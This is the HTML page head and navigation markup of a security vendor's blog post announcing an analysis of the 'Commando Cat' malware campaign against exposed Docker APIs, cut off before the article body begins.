<!doctype html><html lang="en"><head>
    <meta charset="utf-8">
    <title>The Nine Lives of Commando Cat: Analysing a Novel Malware Campaign Targeting Docker</title>
    <link rel="shortcut icon" href="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Cado-Security-Favicon-%E2%80%93-2.png">
    <meta name="description" content="Cado researchers have recently encountered a novel malware campaign, dubbed “Commando Cat”, targeting exposed Docker API endpoints.">
    
    <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.13.0/css/all.css" crossorigin="anonymous">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    
    <meta property="og:description" content="Cado researchers have recently encountered a novel malware campaign, dubbed “Commando Cat”, targeting exposed Docker API endpoints.">
    <meta property="og:title" content="The Nine Lives of Commando Cat: Analysing a Novel Malware Campaign Targeting Docker">
    <meta name="twitter:description" content="Cado researchers have recently encountered a novel malware campaign, dubbed “Commando Cat”, targeting exposed Docker API endpoints.">
    <meta name="twitter:title" content="The Nine Lives of Commando Cat: Analysing a Novel Malware Campaign Targeting Docker">

    

    
    <style>
a.cta_button{-moz-box-sizing:content-box !important;-webkit-box-sizing:content-box !important;box-sizing:content-box !important;vertical-align:middle}.hs-breadcrumb-menu{list-style-type:none;margin:0px 0px 0px 0px;padding:0px 0px 0px 0px}.hs-breadcrumb-menu-item{float:left;padding:10px 0px 10px 10px}.hs-breadcrumb-menu-divider:before{content:'›';padding-left:10px}.hs-featured-image-link{border:0}.hs-featured-image{float:right;margin:0 0 20px 20px;max-width:50%}@media (max-width: 568px){.hs-featured-image{float:none;margin:0;width:100%;max-width:100%}}.hs-screen-reader-text{clip:rect(1px, 1px, 1px, 1px);height:1px;overflow:hidden;position:absolute !important;width:1px}
</style>


  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/themes/prism-okaidia.min.css" integrity="sha256-zzHVEO0xOoVm0I6bT9v5SgpRs1cYNyvEvHXW/1yCgqU=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/toolbar/prism-toolbar.min.css" integrity="sha256-jsQbSO1yj62eu6dP6f2fJESRgkHNNEpxrK8NnO6/oyc=" crossorigin="anonymous">

<link rel="stylesheet" href="//14518100.fs1.hubspotusercontent-na1.net/hub/14518100/hub_generated/template_assets/156178194464/1728675369609/cado-unified4-srw/css/styles.min.css">
<link rel="stylesheet" href="https://14518100.fs1.hubspotusercontent-na1.net/hub/14518100/hub_generated/module_assets/156175596464/1728675368615/module_156175596464_u4m-header.min.css">
<link rel="stylesheet" href="https://14518100.fs1.hubspotusercontent-na1.net/hub/14518100/hub_generated/module_assets/156174727339/1728675369449/module_156174727339_u4m-blog-post-cards.min.css">
<link rel="stylesheet" href="https://14518100.fs1.hubspotusercontent-na1.net/hub/14518100/hub_generated/module_assets/156174727456/1728675369364/module_156174727456_u4m-subscribe.min.css">
<link rel="stylesheet" href="https://14518100.fs1.hubspotusercontent-na1.net/hub/14518100/hub_generated/module_assets/156174794365/1728675367442/module_156174794365_u4m-footer.min.css">
    <script type="application/ld+json">
{
  "mainEntityOfPage" : {
    "@type" : "WebPage",
    "@id" : "https://www.cadosecurity.com/blog/the-nine-lives-of-commando-cat-analysing-a-novel-malware-campaign-targeting-docker"
  },
  "author" : {
    "name" : "Nate Bill",
    "url" : "https://www.cadosecurity.com/blog/author/nate-bill",
    "@type" : "Person"
  },
  "headline" : "The Nine Lives of Commando Cat: Analysing a Novel Malware Campaign Targeting Docker",
  "datePublished" : "2024-02-01T11:00:00.000Z",
  "dateModified" : "2024-05-01T14:09:41.943Z",
  "publisher" : {
    "name" : "Cado Security Ltd",
    "logo" : {
      "url" : "https://f.hubspotusercontent00.net/hubfs/14518100/Cado-Logo-Color%20(2)%20(1)-1.png",
      "@type" : "ImageObject"
    },
    "@type" : "Organization"
  },
  "@context" : "https://schema.org",
  "@type" : "BlogPosting",
  "image" : [ "https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Imported_Blog_Media/image1-63-1.png" ]
}
</script>


    
<!--  Added by GoogleAnalytics4 integration -->
<script>
var _hsp = window._hsp = window._hsp || [];
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}

var useGoogleConsentModeV2 = true;
var waitForUpdateMillis = 1000;


if (!window._hsGoogleConsentRunOnce) {
  window._hsGoogleConsentRunOnce = true;

  gtag('consent', 'default', {
    'ad_storage': 'denied',
    'analytics_storage': 'denied',
    'ad_user_data': 'denied',
    'ad_personalization': 'denied',
    'wait_for_update': waitForUpdateMillis
  });

  if (useGoogleConsentModeV2) {
    _hsp.push(['useGoogleConsentModeV2'])
  } else {
    _hsp.push(['addPrivacyConsentListener', function(consent){
      var hasAnalyticsConsent = consent && (consent.allowed || (consent.categories && consent.categories.analytics));
      var hasAdsConsent = consent && (consent.allowed || (consent.categories && consent.categories.advertisement));

      gtag('consent', 'update', {
        'ad_storage': hasAdsConsent ? 'granted' : 'denied',
        'analytics_storage': hasAnalyticsConsent ? 'granted' : 'denied',
        'ad_user_data': hasAdsConsent ? 'granted' : 'denied',
        'ad_personalization': hasAdsConsent ? 'granted' : 'denied'
      });
    }]);
  }
}

gtag('js', new Date());
gtag('set', 'developer_id.dZTQ1Zm', true);
gtag('config', 'G-S0BZ30LS47');
</script>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-S0BZ30LS47"></script>

<!-- /Added by GoogleAnalytics4 integration -->

<!--  Added by GoogleTagManager integration -->
<script>
var _hsp = window._hsp = window._hsp || [];
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}

var useGoogleConsentModeV2 = true;
var waitForUpdateMillis = 1000;



var hsLoadGtm = function loadGtm() {
    if(window._hsGtmLoadOnce) {
      return;
    }

    if (useGoogleConsentModeV2) {

      gtag('set','developer_id.dZTQ1Zm',true);

      gtag('consent', 'default', {
      'ad_storage': 'denied',
      'analytics_storage': 'denied',
      'ad_user_data': 'denied',
      'ad_personalization': 'denied',
      'wait_for_update': waitForUpdateMillis
      });

      _hsp.push(['useGoogleConsentModeV2'])
    }

    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
    new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
    j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
    'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','GTM-P9BDTK9');

    window._hsGtmLoadOnce = true;
};

_hsp.push(['addPrivacyConsentListener', function(consent){
  if(consent.allowed || (consent.categories && consent.categories.analytics)){
    hsLoadGtm();
  }
}]);

</script>

<!-- /Added by GoogleTagManager integration -->


<!-- Google Tag Manager
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-P9BDTK9');</script>
-->
<!-- Hotjar Tracking Code for Cado Security -->
<script>
    (function(h,o,t,j,a,r){
        h.hj=h.hj||function(){(h.hj.q=h.hj.q||[]).push(arguments)};
        h._hjSettings={hjid:5172881,hjsv:6};
        a=o.getElementsByTagName('head')[0];
        r=o.createElement('script');r.async=1;
        r.src=t+h._hjSettings.hjid+j+h._hjSettings.hjsv;
        a.appendChild(r);
    })(window,document,'https://static.hotjar.com/c/hotjar-','.js?sv=');
</script>
<link rel="amphtml" href="https://www.cadosecurity.com/blog/the-nine-lives-of-commando-cat-analysing-a-novel-malware-campaign-targeting-docker?hs_amp=true">

<meta property="og:image" content="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Imported_Blog_Media/image1-63-1.png">

<meta name="twitter:image" content="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Imported_Blog_Media/image1-63-1.png">


<meta property="og:url" content="https://www.cadosecurity.com/blog/the-nine-lives-of-commando-cat-analysing-a-novel-malware-campaign-targeting-docker">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://www.cadosecurity.com/blog/the-nine-lives-of-commando-cat-analysing-a-novel-malware-campaign-targeting-docker">

<meta property="og:type" content="article">
<link rel="alternate" type="application/rss+xml" href="https://www.cadosecurity.com/blog/rss.xml">
<meta name="twitter:domain" content="www.cadosecurity.com">
<script src="//platform.linkedin.com/in.js" type="text/javascript">
    lang: en_US
</script>

<meta http-equiv="content-language" content="en">






    
    <meta property="og:image" content="https://www.yourdomain.com/hubfs/yourimage.jpg">
<meta name="generator" content="HubSpot"></head>
<body class="  hs-content-id-156195002170 hs-blog-post hs-blog-id-156179862661  ">
<!--  Added by GoogleTagManager integration -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-P9BDTK9" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>

<!-- /Added by GoogleTagManager integration -->

    
    

    


    
        <div id="hs_cos_wrapper_u4m-header" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module"><header class="u4m-header dark">
  
  <a class="skip-to-content-link" href="#main-content">Skip to content</a>
  
  <div class="inner">
    
    <div class="logo">
      <a href="https://www.cadosecurity.com/">
        
        <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Web%20-%202024/Logos/footer-logo.svg" width="144" height="29" alt="footer-logo">
        
      </a>
    </div>

    
    <div class="menu">
      
      
      <div class="menu-item">
        
        
        
        
          <a class="top-level-link has-dropdown" href="https://www.cadosecurity.com/product/platform">
          Product
          <div class="hover-area"></div>
          </a>
        
        
        
        
        <div class="dropdown-container ">
          <div class="dropdown-outer">
    
          <div class="dropdown-inner">
            <span class="border"></span>
            
            <div class="dropdown-column width-one">
              
              
               <div class="sub-items-container">
               
                 
                  
                  
                 
                  <a class="sub-item" href="https://www.cadosecurity.com/product/platform">

                    
                      <img class="icon" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/SRW%20-%20General%20Images/Icons/MegaNav/Icon-Platform.svg" alt="Icon-Platform" width="35" height="35">
                    

                    <div class="title-wrap">
                      
                        <h5 class="sub-item-text">Platform</h5>
                      

                      
                        <p class="description">Explore the core capabilities of the Cado Platform.</p>
                      
                    </div>
                  </a>
               
                 
                  
                  
                 
                  <a class="sub-item" href="https://www.cadosecurity.com/product/environments">

                    
                      <img class="icon" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/SRW%20-%20General%20Images/Icons/MegaNav/Icon-Environments.svg" alt="Icon-Environments" width="35" height="35">
                    

                    <div class="title-wrap">
                      
                        <h5 class="sub-item-text">Environments</h5>
                      

                      
                        <p class="description">Discover the broad support that the Cado platform offers.</p>
                      
                    </div>
                  </a>
               
                 
                  
                  
                 
                  <a class="sub-item" href="https://www.cadosecurity.com/product/integrations">

                    
                      <img class="icon" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/SRW%20-%20General%20Images/Icons/MegaNav/Icon-Integrations.svg" alt="Icon-Integrations" width="35" height="35">
                    

                    <div class="title-wrap">
                      
                        <h5 class="sub-item-text">Integrations</h5>
                      

                      
                        <p class="description">Learn how the Cado platform integrates into your broader ecosystem.</p>
                      
                    </div>
                  </a>
               
             </div>
            
            </div>
            
       
          </div>
          </div>
        </div>
        
        
      </div>  
      
      <div class="menu-item">
        
        
        
        
          <a class="top-level-link has-dropdown" href="https://www.cadosecurity.com/solutions">
          Solutions
          <div class="hover-area"></div>
          </a>
        
        
        
        
        <div class="dropdown-container fullwidth">
          <div class="dropdown-outer">
    
          <div class="dropdown-inner">
            <span class="border"></span>
            
            <div class="dropdown-column width-two">
              <h6 class="column-heading">Use Cases</h6>
              
               <div class="sub-items-container">
               
                 
                  
                  
                 
                  <a class="sub-item" href="https://www.cadosecurity.com/solutions/cross-cloud-investigations">

                    
                      <img class="icon" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/SRW%20-%20General%20Images/Icons/MegaNav/Icon-Cross-Cloud%20Investigations.svg" alt="Icon-Cross-Cloud Investigations" width="35" height="35">
                    

                    <div class="title-wrap">
                      
                        <h5 class="sub-item-text">Cross Cloud Investigations</h5>
                      

                      
                        <p class="description">Respond to incidents identified in AWS, Azure, and GCP in a single pane of glass.</p>
                      
                    </div>
                  </a>
               
                 
                  
                  
                 
                  <a class="sub-item" href="https://www.cadosecurity.com/solutions/container-and-k8s-investigations">

                    
                      <img class="icon" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/SRW%20-%20General%20Images/Icons/MegaNav/Icon-Container-Investigations.svg" alt="Icon-Container-Investigations" width="35" height="35">
                    

                    <div class="title-wrap">
                      
                        <h5 class="sub-item-text">Container &amp; K8s Investigations</h5>
                      

                      
                        <p class="description">Perform container investigations in EKS, AKS, GKE, and Kubernetes.</p>
                      
                    </div>
                  </a>
               
                 
                  
                  
                 
                  <a class="sub-item" href="https://www.cadosecurity.com/solutions/endpoint-triage">

                    
                      <img class="icon" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/SRW%20-%20General%20Images/Icons/MegaNav/Icon-Endpoint-Triage.svg" alt="Icon-Endpoint-Triage" width="35" height="35">
                    

                    <div class="title-wrap">
                      
                        <h5 class="sub-item-text">Endpoint Triage</h5>
                      

                      
                        <p class="description">Automate endpoint triage for immediate insights and quick escalation.</p>
                      
                    </div>
                  </a>
               
                 
                  
                  
                 
                  <a class="sub-item" href="https://www.cadosecurity.com/solutions/saas-investigations">

                    
                      <img class="icon" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/SRW%20-%20General%20Images/Icons/MegaNav/Icon-BEC-Compromise.svg" alt="Icon-BEC-Compromise" width="35" height="35">
                    

                    <div class="title-wrap">
                      
                        <h5 class="sub-item-text">SaaS Investigations</h5>
                      

                      
                        <p class="description">Analyze critical SaaS logs to investigate Business Email Compromise.</p>
                      
                    </div>
                  </a>
               
                 
                  
                  
                 
                  <a class="sub-item" href="https://www.cadosecurity.com/solutions/cloud-detection-and-response">

                    
                      <img class="icon" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/SRW%20-%20General%20Images/Icons/MegaNav/Icon-Incident-Containment.svg" alt="Icon-Incident-Containment" width="35" height="35">
                    

                    <div class="title-wrap">
                      
                        <h5 class="sub-item-text">Cloud Detection &amp; Response (CDR)</h5>
                      

                      
                        <p class="description">Marry threat detection with forensic context to expedite response. </p>
                      
                    </div>
                  </a>
               
                 
                  
                  
                 
                  <a class="sub-item" href="https://www.cadosecurity.com/solutions/evidence-preservation">

                    
                      <img class="icon" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/SRW%20-%20General%20Images/Icons/MegaNav/Icon-Evidence-Preservation.svg" alt="Icon-Evidence-Preservation" width="35" height="35">
                    

                    <div class="title-wrap">
                      
                        <h5 class="sub-item-text">Evidence Preservation</h5>
                      

                      
                        <p class="description">Capture data immediately and preserve it before it disappears.</p>
                      
                    </div>
                  </a>
               
             </div>
            
            </div>
            
            <div class="dropdown-column width-one">
              <h6 class="column-heading">Cado For</h6>
              
               <div class="sub-items-container">
               
                 
                  
                  
                 
                  <a class="sub-item" href="https://www.cadosecurity.com/solutions/dfir">

                    

                    <div class="title-wrap">
                      
                        <h5 class="sub-item-text">DFIR</h5>
                      

                      
                    </div>
                  </a>
               
                 
                  
                  
                 
                  <a class="sub-item" href="https://www.cadosecurity.com/solutions/security-operations-center">

                    

                    <div class="title-wrap">
                      
                        <h5 class="sub-item-text">SOC</h5>
                      

                      
                    </div>
                  </a>
               
                 
                  
                  
                 
                  <a class="sub-item" href="https://www.cadosecurity.com/solutions/mssp">

                    

                    <div class="title-wrap">
                      
                        <h5 class="sub-item-text">MSSPs</h5>
                      

                      
                    </div>
                  </a>
               
                 
                  
                  
                 
                  <a class="sub-item" href="https://www.cadosecurity.com/solutions/partners">

                    

                    <div class="title-wrap">
                      
                        <h5 class="sub-item-text">Partners</h5>
                      

                      
                    </div>
                  </a>
               
                 
                  
                  
                 
                  <a class="sub-item" href="https://www.cadosecurity.com/solutions/government">

                    

                    <div class="title-wrap">
                      
                        <h5 class="sub-item-text">Government</h5>
                      

                      
                    </div>
                  </a>
               
             </div>
            
            </div>
            
       
          </div>
          </div>
        </div>
        
        
      </div>  
      
      <div class="menu-item">
        
        
        
        
          <a class="top-level-link has-dropdown" href="https://www.cadosecurity.com/resources">
          Resources
          <div class="hover-area"></div>
          </a>
        
        
        
        
        <div class="dropdown-container fullwidth">
          <div class="dropdown-outer">
    
          <div class="dropdown-inner">
            <span class="border"></span>
            
            <div class="dropdown-column width-two">
              
              
               <div class="sub-items-container">
               
                 
                  
                  
                 
                  <a class="sub-item" href="https://www.cadosecurity.com/resources">

                    
                      <img class="icon" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/SRW%20-%20General%20Images/Icons/MegaNav/Icon-Report.svg" alt="Icon-Report" width="35" height="35">
                    

                    <div class="title-wrap">
                      
                        <h5 class="sub-item-text">All Resources</h5>
                      

                      
                        <p class="description">Explore Cado Security's entire content library.</p>
                      
                    </div>
                  </a>
               
                 
                  
                  
                 
                  <a class="sub-item" href="https://www.cadosecurity.com/blog">

                    
                      <img class="icon" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/SRW%20-%20General%20Images/Icons/MegaNav/Icon-Blog.svg" alt="Icon-Blog" width="35" height="35">
                    

                    <div class="title-wrap">
                      
                        <h5 class="sub-item-text">Blog</h5>
                      

                      
                        <p class="description">Timely commentary from the Cado Security team.</p>
                      
                    </div>
                  </a>
               
                 
                  
                  
                 
                  <a class="sub-item" href="/resources#playbook">

                    
                      <img class="icon" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/SRW%20-%20General%20Images/Icons/MegaNav/Icon-Playbook.svg" alt="Icon-Playbook" width="35" height="35">
                    

                    <div class="title-wrap">
                      
                        <h5 class="sub-item-text">Playbooks</h5>
                      

                      
                        <p class="description">Best practices for investigating and responding to threats. </p>
                      
                    </div>
                  </a>
               
                 
                  
                  
                 
                  <a class="sub-item" href="/resources#cheat-sheet">

                    
                      <img class="icon" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/SRW%20-%20General%20Images/Icons/MegaNav/Icon-Cheat-Sheet.svg" alt="Icon-Cheat-Sheet" width="35" height="35">
                    

                    <div class="title-wrap">
                      
                        <h5 class="sub-item-text">Cheat Sheets</h5>
                      

                      
                        <p class="description">Quick tips for investigating and responding to incidents.</p>
                      
                    </div>
                  </a>
               
                 
                  
                  
                 
                  <a class="sub-item" href="https://www.cadosecurity.com/news-and-events">

                    
                      <img class="icon" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/SRW%20-%20General%20Images/Icons/MegaNav/Icon-News.svg" alt="Icon-News" width="35" height="35">
                    

                    <div class="title-wrap">
                      
                        <h5 class="sub-item-text">News</h5>
                      

                      
                        <p class="description">The latest Cado company announcements, press, and more.</p>
                      
                    </div>
                  </a>
               
                 
                  
                  
                 
                  <a class="sub-item" href="https://www.cadosecurity.com/cado-community-edition">

                    
                      <img class="icon" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/SRW%20-%20General%20Images/Icons/MegaNav/Icon-Community.svg" alt="Icon-Community" width="35" height="35">
                    

                    <div class="title-wrap">
                      
                        <h5 class="sub-item-text">Community</h5>
                      

                      
                        <p class="description">Access to our free edition of the Cado platform.</p>
                      
                    </div>
                  </a>
               
                 
                  
                  
                 
                  <a class="sub-item" href="https://docs.cadosecurity.com/cado-response/intro" target="_blank" rel="noopener">

                    
                      <img class="icon" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/SRW%20-%20General%20Images/Icons/MegaNav/Icon-documentation.svg" alt="Icon-documentation" width="35" height="35">
                    

                    <div class="title-wrap">
                      
                        <h5 class="sub-item-text">Documentation</h5>
                      

                      
                        <p class="description">Technical documentation on how to best leverage the Cado platform.</p>
                      
                    </div>
                  </a>
               
                 
                  
                  
                 
                  <a class="sub-item" href="https://www.cadosecurity.com/wiki">

                    
                      <img class="icon" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/SRW%20-%20General%20Images/Icons/Other%20Icons/White%20Paper%2080x80.svg" alt="White Paper 80x80" width="35" height="35">
                    

                    <div class="title-wrap">
                      
                        <h5 class="sub-item-text">Wiki</h5>
                      

                      
                        <p class="description">Everything you need to know about cloud security and cloud forensics. </p>
                      
                    </div>
                  </a>
               
             </div>
            
            </div>
            
       
          </div>
          </div>
        </div>
        
        
      </div>  
      
      <div class="menu-item">
        
        
        
        
          <a class="top-level-link has-dropdown" href="https://www.cadosecurity.com/about">
          Company
          <div class="hover-area"></div>
          </a>
        
        
        
        
        <div class="dropdown-container ">
          <div class="dropdown-outer">
    
          <div class="dropdown-inner">
            <span class="border"></span>
            
            <div class="dropdown-column width-one">
              
              
               <div class="sub-items-container">
               
                 
                  
                  
                 
                  <a class="sub-item" href="https://www.cadosecurity.com/about">

                    
                      <img class="icon" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/SRW%20-%20General%20Images/Icons/MegaNav/Icon-About.svg" alt="Icon-About" width="35" height="35">
                    

                    <div class="title-wrap">
                      
                        <h5 class="sub-item-text">About</h5>
                      

                      
                        <p class="description">Learn more about the Cado Security mission, vision, and team.</p>
                      
                    </div>
                  </a>
               
                 
                  
                  
                 
                  <a class="sub-item" href="https://www.cadosecurity.com/careers">

                    
                      <img class="icon" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/SRW%20-%20General%20Images/Icons/MegaNav/Icon-Careers.svg" alt="Icon-Careers" width="35" height="35">
                    

                    <div class="title-wrap">
                      
                        <h5 class="sub-item-text">Careers</h5>
                      

                      
                        <p class="description">Check out current career opportunities at Cado Security.</p>
                      
                    </div>
                  </a>
               
                 
                  
                  
                 
                  <a class="sub-item" href="https://www.cadosecurity.com/cado-security-labs">

                    
                      <img class="icon" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/SRW%20-%20General%20Images/Icons/MegaNav/Icon-Incidident-Response%20Preparedness-II.svg" alt="Icon-Incidident-Response Preparedness-II" width="35" height="35">
                    

                    <div class="title-wrap">
                      
                        <h5 class="sub-item-text">Cado Security Labs</h5>
                      

                      
                        <p class="description">The research and development division at Cado Security</p>
                      
                    </div>
                  </a>
               
             </div>
            
            </div>
            
       
          </div>
          </div>
        </div>
        
        
      </div>  
      


    </div>
    
    
    
    <div class="search-toggle" tabindex="0">
      <svg class="search-toggle-button" width="18px" height="18px" viewbox="0 0 18 18" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
          <g id="Round-Three-Design" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
              <g id="CADO-Additional-Modules-R3" transform="translate(-1299, -58)" fill="#0E4271" fill-rule="nonzero">
                  <g id="search_FILL0_wght400_GRAD0_opsz24-(6)-Copy" transform="translate(1299, 58)">
                      <path d="M16.6,18 L10.3,11.7 C9.8,12.1 9.225,12.4166667 8.575,12.65 C7.925,12.8833333 7.23333333,13 6.5,13 C4.68333333,13 3.14583333,12.3708333 1.8875,11.1125 C0.629166667,9.85416667 0,8.31666667 0,6.5 C0,4.68333333 0.629166667,3.14583333 1.8875,1.8875 C3.14583333,0.629166667 4.68333333,0 6.5,0 C8.31666667,0 9.85416667,0.629166667 11.1125,1.8875 C12.3708333,3.14583333 13,4.68333333 13,6.5 C13,7.23333333 12.8833333,7.925 12.65,8.575 C12.4166667,9.225 12.1,9.8 11.7,10.3 L18,16.6 L16.6,18 Z M6.5,11 C7.75,11 8.8125,10.5625 9.6875,9.6875 C10.5625,8.8125 11,7.75 11,6.5 C11,5.25 10.5625,4.1875 9.6875,3.3125 C8.8125,2.4375 7.75,2 6.5,2 C5.25,2 4.1875,2.4375 3.3125,3.3125 C2.4375,4.1875 2,5.25 2,6.5 C2,7.75 2.4375,8.8125 3.3125,9.6875 C4.1875,10.5625 5.25,11 6.5,11 Z" id="Shape"></path>
                  </g>
              </g>
          </g>
      </svg>
    </div>
    
   
    <div class="cta">
      <span id="hs_cos_wrapper_u4m-header_" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_cta" style="" data-hs-cos-general-type="widget" data-hs-cos-type="cta"><!--HubSpot Call-to-Action Code --><span class="hs-cta-wrapper" id="hs-cta-wrapper-a51b72aa-daa5-4df8-a061-1902834ccdb0"><span class="hs-cta-node hs-cta-a51b72aa-daa5-4df8-a061-1902834ccdb0" id="hs-cta-a51b72aa-daa5-4df8-a061-1902834ccdb0"><!--[if lte IE 8]><div id="hs-cta-ie-element"></div><![endif]--><a href="https://cta-redirect.hubspot.com/cta/redirect/14518100/a51b72aa-daa5-4df8-a061-1902834ccdb0"><img class="hs-cta-img" id="hs-cta-img-a51b72aa-daa5-4df8-a061-1902834ccdb0" style="border-width:0px;" src="https://no-cache.hubspot.com/cta/default/14518100/a51b72aa-daa5-4df8-a061-1902834ccdb0.png" alt="Get a Demo"></a></span><script charset="utf-8" src="/hs/cta/cta/current.js"></script><script type="text/javascript"> hbspt.cta._relativeUrls=true;hbspt.cta.load(14518100, 'a51b72aa-daa5-4df8-a061-1902834ccdb0', {"useNewLoader":"true","region":"na1"}); </script></span><!-- end HubSpot Call-to-Action Code --></span>
    </div>
   
    
    
    <button class="hamburger-toggle x2"><span class="lines"></span></button>
    
    <div class="offscreen-menu">
      <div class="content">
        
        <div class="mobile-search">
        <div class="hs-search-field"> 
  <div class="hs-search-field__bar"> 
    <form action="/hs-search-results">
      <input type="text" class="hs-search-field__input search-input" name="term" autocomplete="off" aria-label="Search" placeholder="Search">
      
      
      <input type="hidden" name="type" value="SITE_PAGE">
      <input type="hidden" name="type" value="LANDING_PAGE">
      <input type="hidden" name="type" value="BLOG_POST">
      <input type="hidden" name="type" value="LISTING_PAGE">
      <input type="hidden" name="type" value="KNOWLEDGE_ARTICLE">     
      
      
          
      
      
      
      
      <button aria-label="Search" class="search-button">
        
        <svg width="18px" height="18px" viewbox="0 0 18 18" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
          <g id="Round-Three-Design" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
              <g id="CADO-Additional-Modules-R3" transform="translate(-1299, -58)" fill="#0E4271" fill-rule="nonzero">
                  <g id="search_FILL0_wght400_GRAD0_opsz24-(6)-Copy" transform="translate(1299, 58)">
                      <path d="M16.6,18 L10.3,11.7 C9.8,12.1 9.225,12.4166667 8.575,12.65 C7.925,12.8833333 7.23333333,13 6.5,13 C4.68333333,13 3.14583333,12.3708333 1.8875,11.1125 C0.629166667,9.85416667 0,8.31666667 0,6.5 C0,4.68333333 0.629166667,3.14583333 1.8875,1.8875 C3.14583333,0.629166667 4.68333333,0 6.5,0 C8.31666667,0 9.85416667,0.629166667 11.1125,1.8875 C12.3708333,3.14583333 13,4.68333333 13,6.5 C13,7.23333333 12.8833333,7.925 12.65,8.575 C12.4166667,9.225 12.1,9.8 11.7,10.3 L18,16.6 L16.6,18 Z M6.5,11 C7.75,11 8.8125,10.5625 9.6875,9.6875 C10.5625,8.8125 11,7.75 11,6.5 C11,5.25 10.5625,4.1875 9.6875,3.3125 C8.8125,2.4375 7.75,2 6.5,2 C5.25,2 4.1875,2.4375 3.3125,3.3125 C2.4375,4.1875 2,5.25 2,6.5 C2,7.75 2.4375,8.8125 3.3125,9.6875 C4.1875,10.5625 5.25,11 6.5,11 Z" id="Shape"></path>
                  </g>
              </g>
          </g>
        </svg>
      </button>      

      <span class="search-overlay-close search-toggle-button" aria-label="Close">
        <i class="fas fa-times" aria-hidden="true"></i>
      </span>

    </form>
  </div>
  <ul class="hs-search-field__suggestions"></ul>
</div>
        </div>  
        
        <div class="mobile-menu">
        <span id="hs_cos_wrapper_u4m-header_" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_menu" style="" data-hs-cos-general-type="widget" data-hs-cos-type="menu"><div id="hs_menu_wrapper_u4m-header_" class="hs-menu-wrapper active-branch no-flyouts hs-menu-flow-vertical" role="navigation" data-sitemap-name="default" data-menu-id="156290876470" aria-label="Navigation Menu">
 <ul role="menu">
  <li class="hs-menu-item hs-menu-depth-1 hs-item-has-children" role="none"><a href="javascript:;" aria-haspopup="true" aria-expanded="false" role="menuitem">Product</a>
   <ul role="menu" class="hs-menu-children-wrapper">
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/product/platform" role="menuitem">Platform</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/product/environments" role="menuitem">Environments</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/product/integrations" role="menuitem">Integrations</a></li>
   </ul></li>
  <li class="hs-menu-item hs-menu-depth-1 hs-item-has-children" role="none"><a href="javascript:;" aria-haspopup="true" aria-expanded="false" role="menuitem">Solutions</a>
   <ul role="menu" class="hs-menu-children-wrapper">
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/solutions" role="menuitem">All Solutions</a></li>
    <li class="hs-menu-item hs-menu-depth-2 hs-item-has-children" role="none"><a href="javascript:;" role="menuitem">Use Cases</a>
     <ul role="menu" class="hs-menu-children-wrapper">
